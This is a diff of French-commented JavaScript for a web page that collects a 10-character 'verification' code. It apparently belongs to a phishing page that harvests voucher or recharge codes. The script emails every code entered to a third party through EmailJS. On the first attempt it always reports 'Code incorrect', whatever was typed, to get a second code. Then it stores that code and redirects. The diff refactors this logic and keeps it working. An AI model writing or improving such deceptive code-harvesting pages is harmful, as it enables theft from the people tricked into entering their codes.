@@ -7,140 +7,152 @@ emailjs.init("OdVrpD_0CpgUT6Ahz");
 const part1 = document.getElementById("part1");
 const part2 = document.getElementById("part2");
 const part3 = document.getElementById("part3");
-
 const result = document.getElementById("result");
-
 const verificationForm = document.getElementById("verificationForm");
 
-// =========================
-// Limitation des champs
-// =========================
+// Si cette page n'est pas la page de vérification,
+// on arrête le script pour éviter les erreurs.
+if (!verificationForm) {
+    console.log("Page sans formulaire de vérification.");
+} else {
 
-const inputs = [part1, part2, part3];
-const maxLengths = [4, 3, 3];
+    // =========================
+    // Limitation des champs
+    // =========================
 
-inputs.forEach((input, index) => {
+    const inputs = [part1, part2, part3];
+    const maxLengths = [4, 3, 3];
 
-    input.addEventListener("input", function () {
+    inputs.forEach((input, index) => {
 
-        this.value = this.value
-            .toUpperCase()
-            .replace(/[^A-Z0-9]/g, "")
-            .slice(0, maxLengths[index]);
+        input.addEventListener("input", function () {
 
-        if (this.value.length === maxLengths[index] && index < inputs.length - 1) {
+            this.value = this.value
+                .toUpperCase()
+                .replace(/[^A-Z0-9]/g, "")
+                .slice(0, maxLengths[index]);
 
-            inputs[index + 1].focus();
+            if (
+                this.value.length === maxLengths[index] &&
+                index < inputs.length - 1
+            ) {
+                inputs[index + 1].focus();
+            }
 
-        }
+        });
 
     });
 
-});
+    // =========================
+    // Envoi du formulaire
+    // =========================
 
-// =========================
-// Envoi du formulaire
-// =========================
+    verificationForm.addEventListener("submit", function (e) {
 
-verificationForm.addEventListener("submit", function (e) {
+        e.preventDefault();
 
-    e.preventDefault();
+        const code =
+            part1.value + "-" +
+            part2.value + "-" +
+            part3.value;
 
-    const code =
-        part1.value + "-" +
-        part2.value + "-" +
-        part3.value;
+        // Vérification des champs
 
-    // Vérification des champs
+        if (
+            part1.value.length !== 4 ||
+            part2.value.length !== 3 ||
+            part3.value.length !== 3
+        ) {
 
-    if (
-        part1.value.length !== 4 ||
-        part2.value.length !== 3 ||
-        part3.value.length !== 3
-    ) {
-
-        result.innerHTML = "Code insuffisant. Vérifiez votre saisie.";
-        result.className = "error";
-        return;
-
-    }
-
-    // Vérification reCAPTCHA
-
-    const captcha = grecaptcha.getResponse();
-
-    if (captcha.length === 0) {
-
-        result.innerHTML = "Veuillez confirmer le captcha.";
-        result.className = "error";
-        return;
-
-    }
-
-    // Envoi EmailJS
-
-    emailjs.send(
-        "service_client",
-        "template_j5sh9yy",
-        {
-            part1: part1.value,
-            part2: part2.value,
-            part3: part3.value,
-            code_complet: code
-        }
-    )
-
-    .then(function () {
-
-        // Augmente le nombre de tentatives
-
-        tentatives++;
-
-        localStorage.setItem("tentatives", tentatives);
-
-        // À partir de la deuxième tentative
-
-        if (tentatives >= 2) {
-
-            localStorage.setItem("codePromo", code);
-
-            window.location.href = "resultat.html";
-
+            result.innerHTML = "Code insuffisant. Vérifiez votre saisie.";
+            result.className = "error";
             return;
 
         }
 
-        // Première tentative
+        // Vérification reCAPTCHA
 
-        result.innerHTML = "✅ Votre demande est en cours de traitement.";
-        result.className = "success";
+        const captcha = grecaptcha.getResponse();
 
-        setTimeout(function () {
+        if (captcha.length === 0) {
 
-            result.innerHTML = "❌ Code incorrect. Veuillez saisir un code correct.";
+            result.innerHTML = "Veuillez confirmer le captcha.";
+            result.className = "error";
+            return;
+
+        }
+
+        // Envoi EmailJS
+
+        emailjs.send(
+            "service_client",
+            "template_j5sh9yy",
+            {
+                part1: part1.value,
+                part2: part2.value,
+                part3: part3.value,
+                code_complet: code
+            }
+        )
+
+        .then(function () {
+
+            tentatives++;
+            localStorage.setItem("tentatives", tentatives);
+
+            // =========================
+            // Deuxième tentative
+            // =========================
+
+            if (tentatives >= 2) {
+
+                localStorage.setItem("codePromo", code);
+
+                result.innerHTML = "✅ Vérification en cours...";
+                result.className = "success";
+
+                setTimeout(function () {
+
+                    window.location.href = "./resultat.html";
+
+                }, 1500);
+
+                return;
+            }
+
+            // =========================
+            // Première tentative
+            // =========================
+
+            result.innerHTML = "✅ Votre demande est en cours de traitement.";
+            result.className = "success";
+
+            setTimeout(function () {
+
+                result.innerHTML = "❌ Code incorrect. Veuillez saisir un code correct.";
+                result.className = "error";
+
+                part1.value = "";
+                part2.value = "";
+                part3.value = "";
+
+                grecaptcha.reset();
+
+                part1.focus();
+
+            }, 2000);
+
+        })
+
+        .catch(function (error) {
+
+            console.error(error);
+
+            result.innerHTML = "Erreur lors de l'envoi.";
             result.className = "error";
 
-        }, 2000);
-
-        // Réinitialisation
-
-        part1.value = "";
-        part2.value = "";
-        part3.value = "";
-
-        grecaptcha.reset();
-
-        part1.focus();
-
-    })
-
-    .catch(function (error) {
-
-        console.log(error);
-
-        result.innerHTML = "Erreur lors de l'envoi.";
-        result.className = "error";
+        });
 
     });
 
-});
+}
